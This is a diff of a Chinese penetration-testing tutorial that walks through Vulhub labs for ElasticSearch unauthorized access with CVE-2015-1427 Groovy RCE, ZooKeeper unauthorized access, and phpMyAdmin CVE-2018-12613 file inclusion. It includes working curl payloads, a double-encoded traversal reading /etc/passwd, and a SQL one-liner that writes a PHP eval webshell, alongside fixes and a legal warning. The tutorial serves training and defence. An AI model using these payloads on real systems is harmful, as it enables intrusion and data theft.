@@ -1,11 +1,10 @@
 # Vulhub 高频漏洞实战 · B 级（未授权 / 中间件）
 ## 总览
-| # | 漏洞 | CVE / 类型 | 危害 |
-| --- | --- | --- | --- |
-| 1 | ElasticSearch 未授权 + CVE-2015-1427 Groovy RCE | 未授权 + 沙箱绕过 | 数据泄露 / RCE |
-| 2 | ZooKeeper 未授权 + 配置泄露 | 未授权 | 配置泄露 / 服务接管 |
-| 3 | phpMyAdmin 后台 RCE / CVE-2018-12613 | 文件包含 + 日志写 shell | RCE |
-
+| #   | 漏洞                                           | CVE / 类型         | 危害          |
+| --- | -------------------------------------------- | ---------------- | ----------- |
+| 1   | ElasticSearch 未授权 + CVE-2015-1427 Groovy RCE | 未授权 + 沙箱绕过       | 数据泄露 / RCE  |
+| 2   | ZooKeeper 未授权 + 配置泄露                         | 未授权              | 配置泄露 / 服务接管 |
+| 3   | phpMyAdmin 后台 RCE / CVE-2018-12613           | 文件包含 + 日志写 shell | RCE         |
 
 未授权访问是"中间件安全"的重灾区，与之前学过的 **Redis 未授权** 同属一类。运维人员把中间件直接暴露公网且不开认证，造成的危害往往超过单个 Web 漏洞。
 
@@ -14,7 +13,6 @@
 # 第 1 关 ElasticSearch 未授权 + CVE-2015-1427 Groovy RCE
 ## 1.1 产品介绍
 **ElasticSearch** 是基于 Lucene 的分布式全文搜索/数据分析引擎，使用极广：
-
 + 日志分析（ELK / EFK 栈的核心）
 + 全文搜索（电商商品、文档检索）
 + 监控指标存储
@@ -27,7 +25,6 @@ ElasticSearch 历史安全问题分两类：
 
 ### 1.2.1 未授权访问（默认无认证）
 ElasticSearch 7.x 之前**默认无任何认证**，端口 9200 对外开放即等于完全公开：
-
 + 任意人可读取所有 index / document
 + 可创建 / 删除数据
 + 可查看节点信息（操作系统版本、Java 版本、插件列表）
@@ -83,9 +80,7 @@ docker-compose up -d
 ```bash
 curl http://target:9200/
 ```
-
 返回：
-
 ```json
 {
   "name" : "Surge",
@@ -107,7 +102,6 @@ curl http://target:9200/_cat/indices?v
 ```
 
 返回所有 index 列表：
-
 ```plain
 health status index    uuid                   pri rep docs.count ...
 yellow open   bank     H0gJOXPxSwW3atXkAR0E4A   5   1  1000  ...
@@ -125,13 +119,11 @@ curl http://target:9200/secret/credential/1?pretty
 
 ### 1.4.5 CVE-2015-1427 RCE（Groovy 沙箱绕过）
 **前置：先创建一个 index 并写入一条数据**：
-
 ```bash
 curl -X POST http://target:9200/website/blog/ -d '{"name":"test"}'
 ```
 
 **触发 Groovy 注入**：
-
 ```bash
 curl -X POST http://target:9200/website/blog/1/_search?pretty -d '
 {
@@ -239,7 +231,6 @@ ZooKeeper 历史版本**默认无 ACL（访问控制）**，任何能连上 2181
 + 创建/删除 znode（接管服务注册）
 
 业内著名的"4 字命令"漏洞：
-
 + ZooKeeper 提供 `stat` / `envi` / `dump` / `conf` 等四字母命令
 + 通过简单 TCP 发送四个字母即可获取敏感信息
 
@@ -269,9 +260,7 @@ Node count: 234
 | 默认无认证 | 所有版本（不配置 ACL 时） |
 | 四字命令未限制 | 默认配置 |
 
-
 **利用条件**：
-
 + 2181 端口可达
 + 管理员未配置 ACL（默认）
 
@@ -303,7 +292,6 @@ echo cons | nc target 2181
 # ruok 命令（Are you OK?）
 echo ruok | nc target 2181
 ```
-
 返回大量敏感信息。
 
 ### 2.4.3 用 zkCli 列出所有 znode
@@ -312,7 +300,6 @@ docker run -it --rm zookeeper:3.4.13 zkCli.sh -server target:2181
 ```
 
 进入交互式命令行：
-
 ```plain
 [zk: target:2181(CONNECTED) 0] ls /
 [zookeeper, dubbo, services, config]
@@ -323,12 +310,10 @@ docker run -it --rm zookeeper:3.4.13 zkCli.sh -server target:2181
 [zk: target:2181(CONNECTED) 2] get /config/db
 {"host":"10.0.0.1","port":3306,"user":"root","password":"P@ssw0rd"}
 ```
-
 数据库密码直接拿到。
 
 ### 2.4.4 Dubbo 服务接管
 如果 ZooKeeper 是 Dubbo 注册中心，攻击者可以：
-
 + 注册一个伪造的 Dubbo 服务（同名高优先级）
 + 让正常消费者调用到攻击者的恶意服务
 + 实现中间人攻击或参数窃取
@@ -368,7 +353,6 @@ for host in open('targets.txt'):
 
 ## 2.5 修复建议
 1. **启用 ACL**：
-
 ```bash
 # 在 zkCli 中
 [zk: localhost:2181] addauth digest admin:StrongPass
@@ -376,7 +360,6 @@ for host in open('targets.txt'):
 ```
 
 2. **限制四字命令**（3.5.x 之后）：
-
 ```properties
 # zoo.cfg
 4lw.commands.whitelist=stat,ruok
@@ -392,12 +375,10 @@ for host in open('targets.txt'):
 # 第 3 关 phpMyAdmin 后台 RCE / CVE-2018-12613
 ## 3.1 产品介绍
 **phpMyAdmin** 是 MySQL/MariaDB 的 Web 管理界面，使用极广：
-
 + 用 PHP 写，开源免费
 + 提供图形化界面管理数据库
 + 几乎所有 LAMP/LNMP 一键包都自带
 + 默认端口 80 / 8080
-
 是渗透测试中"找到 MySQL 后拿 shell"的常用跳板。
 
 ## 3.2 漏洞背景
@@ -408,7 +389,6 @@ phpMyAdmin 4.8.0 / 4.8.1 版本：
 
 + `phpmyadmin/index.php` 的 `target` 参数接收页面名
 + 检查代码：
-
 ```php
 if (! empty($_REQUEST['target']) && is_string($_REQUEST['target'])) {
     if (Core::checkPageValidity($_REQUEST['target'])) {
@@ -417,7 +397,6 @@ if (! empty($_REQUEST['target']) && is_string($_REQUEST['target'])) {
     }
 }
 ```
-
 + `Core::checkPageValidity` 白名单检查不严，可通过二次 URL 编码绕过
 + 攻击者：访问 `?target=db_sql.php%253f/../../../../../../../../etc/passwd` → 包含任意文件
 
@@ -425,7 +404,6 @@ if (! empty($_REQUEST['target']) && is_string($_REQUEST['target'])) {
 
 ### 3.2.2 后台写文件 RCE（通用姿势）
 只要拿到 phpMyAdmin 后台：
-
 + 执行 `SELECT '<?php @eval($_POST[c]);?>' INTO OUTFILE '/var/www/html/shell.php'`
 + 前提：MySQL 有 `FILE` 权限 + `secure_file_priv` 允许写到 web 目录
 
@@ -452,7 +430,6 @@ docker-compose up -d
 
 ### 3.4.2 CVE-2018-12613 文件包含
 **步骤 1：检测漏洞**
-
 ```bash
 curl "http://target/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"
 ```
@@ -460,11 +437,9 @@ curl "http://target/index.php?target=db_sql.php%253f/../../../../../../../../etc
 如果返回页面中能看到 `/etc/passwd` 内容，说明包含成功。
 
 **步骤 2：构造 Session 文件**
-
 phpMyAdmin 把 Session 存储在 `/tmp/sess_<PHPSESSID>`。Session 里会包含 `User-Agent`、`_SESSION` 变量等。
 
 我们可以"创建"一个 Session 文件：
-
 ```bash
 # 在 phpMyAdmin 中执行 SQL（或通过 GET）
 SELECT '<?php phpinfo();?>';
@@ -473,7 +448,6 @@ SELECT '<?php phpinfo();?>';
 phpMyAdmin 会把最近执行的 SQL 存入 Session 文件。
 
 **步骤 3：包含 Session 文件**
-
 ```bash
 curl -b "phpMyAdmin=YOUR_PHPSESSID" \
   "http://target/index.php?target=db_sql.php%253f/../../../../tmp/sess_YOUR_PHPSESSID"
@@ -518,20 +492,17 @@ SHOW VARIABLES LIKE 'secure_file_priv';
 ```
 
 返回：
-
 + `NULL` → 不能写文件（无法用此方法）
 + 空 → 可以写任意路径
 + `/var/lib/mysql-files/` → 只能写该目录
 
 **步骤 2：写 webshell**
-
 ```sql
 SELECT '<?php @eval($_POST["c"]);?>' 
 INTO OUTFILE '/var/www/html/shell.php';
 ```
 
 **步骤 3：访问 webshell**
-
 ```bash
 curl -X POST http://target/shell.php -d 'c=phpinfo();'
 ```
@@ -617,15 +588,15 @@ secure_file_priv=/tmp/uploads    # 限制可写目录（不在 web 根）
 ## 法律与授权提醒
 ```plain
 ┌──────────────────────────────────────────────────────────┐
-│ 1. 所有复现必须在本地 Vulhub 或授权环境                  │
-│ 2. 中间件未授权在互联网上极常见，访问即可能违法          │
-│ 3. 数据库内容（用户、订单、密码）属于"公民个人信息"      │
-│    未授权读取可能构成                                    │
-│    - 《刑法》253 条之一 侵犯公民个人信息罪               │
-│    - 《刑法》285 条 非法侵入计算机信息系统罪             │
-│    - 《个人信息保护法》                                  │
-│ 4. 读取数据后绝对不可下载、传播、交易                    │
-│ 5. 即使 SRC 范围内，发现未授权数据库应立即报告，不深挖   │
+│ 1. 所有复现必须在本地 Vulhub 或授权环境                      │
+│ 2. 中间件未授权在互联网上极常见，访问即可能违法                 │
+│ 3. 数据库内容（用户、订单、密码）属于"公民个人信息"             │
+│    未授权读取可能构成                                       │
+│    - 《刑法》253 条之一 侵犯公民个人信息罪                    │
+│    - 《刑法》285 条 非法侵入计算机信息系统罪                  │
+│    - 《个人信息保护法》                                     │
+│ 4. 读取数据后绝对不可下载、传播、交易                         │
+│ 5. 即使 SRC 范围内，发现未授权数据库应立即报告，不深挖          │
 └──────────────────────────────────────────────────────────┘
 ```
 
@@ -644,7 +615,6 @@ secure_file_priv=/tmp/uploads    # 限制可写目录（不在 web 根）
 
 
 学习路径回顾：
-
 ```plain
 第 1 阶段（基础）：Top 10 漏洞类型（SQL 注入 / XSS / CSRF / SSRF / XXE / 文件上传 / 命令注入 / 反序列化 / 越权 / 逻辑漏洞 / SSTI）
                               ↓
